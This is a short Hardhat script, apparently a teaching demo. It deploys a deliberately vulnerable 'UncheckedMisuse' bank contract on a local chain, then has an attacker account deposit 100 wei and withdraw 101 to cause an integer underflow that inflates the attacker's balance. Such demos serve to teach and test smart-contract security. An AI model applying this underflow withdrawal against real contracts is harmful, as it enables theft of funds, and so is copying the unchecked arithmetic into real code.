const { ethers } = require("hardhat");

const main = async () => {
    const [ owner, attacker ] = await ethers.getSigners();
    const Bank = await ethers.getContractFactory('UncheckedMisuse', owner);
    const bank = await Bank.deploy();
    await bank.deployed();

    console.log(`\n==== Attack is coming 👾 ... ====`);
    console.log(`Attacker deposit 100 wei...`);
    await bank.connect(attacker).deposit(100);
    console.log(`Attacker check his own balance: ${await bank.connect(attacker).balance(attacker.address)} wei`);
    console.log(`Attacker withdraws much more than his balance to cause a underflow attack...`);
    await bank.connect(attacker).withdraw(101);
    console.log(`Again: attacker check his own balance: ${
        ethers.utils.formatEther(
            await bank.connect(attacker).balance(attacker.address)
        )
    } ether\n`);
}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });